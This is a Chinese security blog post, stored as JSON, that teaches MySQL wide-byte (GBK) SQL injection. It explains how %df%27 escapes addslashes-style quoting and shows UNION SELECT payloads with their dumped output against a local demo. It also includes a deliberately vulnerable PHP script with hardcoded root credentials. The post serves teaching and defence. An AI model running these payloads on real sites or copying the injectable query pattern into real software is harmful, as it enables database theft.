{"title":"SQL注入实例学习待整理","slug":"网安大类/OWASPTOP/SQLInject/SQL注入实例学习","date":"2019-03-29T09:34:30.000Z","updated":"2023-01-31T02:29:10.674Z","url":"2019/3-29-383.html","path":"api/articles/2019/3-29-383.html.json","covers":["https://img.weiyigeek.top/2019/1/20190909221525.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<p>宽字节注入原理：</p>\n<p>产生原因：由于nbb在部署MySQL时候错误在/etc/my.cnf配置，如下这样会导致编码转换从而导致注入的漏洞<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">character-set-cient=gbk </span><br><span class=\"line\"><span class=\"comment\">#或者执行</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> character_set_client=gbk</span><br></pre></td></tr></table></figure></p>\n<p>1.正常情况下当PHP的GPC开启或使用addslashes函数和iconv过滤GET或POST提交的参数时候,我们使用的单引号’就会被转义成为:<code>\\&#39;</code>;<br>2.这个时候由于存在宽字节注入,我们就可以利用该漏洞我们输入%df%27时候首先经过上面提到的单引号转义变成<code>%df%5c%27</code>(MySQL内部变化)而%5c代表的<code>反斜杠\\</code>是转义函数添加；<br>3.实际是因为在数据库查询前由于使用GBK多字节编码,即在汉字编码的范围内两个字节会被编码成为一个汉字,然后在MySQL服务器会对查询的语句进行GBK编码即%df%5c转换成汉字’運’,从而单引号逃逸了出来导致了注入漏洞；</p>\n<p>比如:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">请求1:http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?title&#x3D;1</span><br><span class=\"line\">SQL语句:Select * From test Where title&#x3D;&#39;1&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">请求1:http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?title&#x3D;1</span><br><span class=\"line\">SQL语句:Select * From test Where title&#x3D;&#39;1&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">数据库连接成功!http:&#x2F;&#x2F;127.0.0.1&#x2F;Sec&#x2F;gbkSqlInject.php?id&#x3D;1�\\&#39; union select 1,user(),concat(user,0x7e,context) from content#;</span><br><span class=\"line\">执行的SQL语句:SELECT * FROM user WHERE id &#x3D; &#39;1運&#39; union select 1,user(),concat(user,0x7e,context) from content#;&#39;</span><br><span class=\"line\">admin 6590f73ecdf351c38de00befd2ecf17b</span><br><span class=\"line\">root@localhost weiyigeek~this is a demo</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190909221525.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>GBK编码是数据库的编码与前台的编码无关<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%df </span><br><span class=\"line\">%da</span><br><span class=\"line\">%5c = \\</span><br><span class=\"line\">%27 = <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#逃出过滤</span></span><br><span class=\"line\"><span class=\"string\">%df%5c%27</span></span><br><span class=\"line\"><span class=\"string\">%da%5c%27</span></span><br></pre></td></tr></table></figure></p>\n<p>UTF-8转GBK<br>錦 UTF-8编码:e98ca6<br>GBK编码:%e5%5c</p>\n<p>首先经过addlashes函数或者GPS单引号转变成为:錦’,然后经过iconv函数会对”錦”转换成为gbk编码即:%e5%5c%5c%27正好反斜杠%5c被转义了，从而单引号逃逸出来引发注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/***</span></span><br><span class=\"line\"><span class=\"comment\"> * 描述:MySQL宽字节注入案例</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\">MariaDB [cms]&gt; </span></span><br><span class=\"line\"><span class=\"comment\">create table user(</span></span><br><span class=\"line\"><span class=\"comment\">`id` INT(4) NOT NULL DEFAULT '1',</span></span><br><span class=\"line\"><span class=\"comment\">`user` VARCHAR(255) NOT NULL DEFAULT \"NULL\",</span></span><br><span class=\"line\"><span class=\"comment\">`pass` VARCHAR(255) NOT NULL DEFAULT \"NULL\");</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">create table content(</span></span><br><span class=\"line\"><span class=\"comment\">`id` INT(4) NOT NULL DEFAULT '1',</span></span><br><span class=\"line\"><span class=\"comment\">`user` VARCHAR(255) NOT NULL DEFAULT \"WeiY\",</span></span><br><span class=\"line\"><span class=\"comment\">`context` VARCHAR(255) NOT NULL DEFAULT \"this is demo\");</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">insert into user value (1,\"admin\",md5(\"1223456\"));</span></span><br><span class=\"line\"><span class=\"comment\">MariaDB [cms]&gt; select * from user;</span></span><br><span class=\"line\"><span class=\"comment\">+----+-------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">| id | user  | pass                             |</span></span><br><span class=\"line\"><span class=\"comment\">+----+-------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">|  1 | admin | 6590f73ecdf351c38de00befd2ecf17b |</span></span><br><span class=\"line\"><span class=\"comment\">+----+-------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">1 row in set (0.00 sec)</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">insert into content value (1,\"weiyigeek\");</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">#支持识别16进制</span></span><br><span class=\"line\"><span class=\"comment\">MariaDB [cms]&gt; select * from user where id = 1 union select 1,user(),concat(user,0x7e,context) from content;</span></span><br><span class=\"line\"><span class=\"comment\">+----+----------------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">| id | user           | pass                             |</span></span><br><span class=\"line\"><span class=\"comment\">+----+----------------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">|  1 | admin          | 6590f73ecdf351c38de00befd2ecf17b |</span></span><br><span class=\"line\"><span class=\"comment\">|  1 | root<span class=\"doctag\">@localhost</span> | weiyigeek~this is a demo         |</span></span><br><span class=\"line\"><span class=\"comment\">+----+----------------+----------------------------------+</span></span><br><span class=\"line\"><span class=\"comment\">2 rows in set (0.00 sec)</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"></span><br><span class=\"line\">$link = <span class=\"keyword\">new</span> mysqli(<span class=\"string\">'localhost'</span>, <span class=\"string\">'root'</span>,<span class=\"string\">'123456'</span>, <span class=\"string\">'cms'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$link)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"数据库连接失败!\"</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"数据库连接成功!\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$link-&gt;query(<span class=\"string\">\"set NAMES gbk\"</span>);</span><br><span class=\"line\">$id_tmp=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'id'</span>])?urldecode($_GET[<span class=\"string\">'id'</span>]):<span class=\"string\">\"null\"</span>;</span><br><span class=\"line\">$id=iconv(<span class=\"string\">\"gbk\"</span>,<span class=\"string\">\"utf-8\"</span>,$id_tmp);</span><br><span class=\"line\">$sql=<span class=\"string\">\"SELECT * FROM user WHERE id = '&#123;$id&#125;'\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"http://\"</span>.$_SERVER[<span class=\"string\">'HTTP_HOST'</span>].$_SERVER[<span class=\"string\">'PHP_SELF'</span>].<span class=\"string\">\"?\"</span>.urldecode($_SERVER[<span class=\"string\">'QUERY_STRING'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;执行的SQL语句:\"</span>.$sql;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($link-&gt;query($sql) <span class=\"keyword\">as</span> $row)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">print</span>(<span class=\"string\">\"\\n\"</span>.$row[<span class=\"string\">'user'</span>].<span class=\"string\">\"\\n\"</span>.$row[<span class=\"string\">'pass'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>","comments":true,"excerpt":"注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。[TOC]","categories":[{"name":"黑防","path":"api/categories/黑防.json"},{"name":"网站管理","path":"api/categories/网站管理.json"}],"tags":[{"name":"SQL注入","path":"api/tags/SQL注入.json"}]}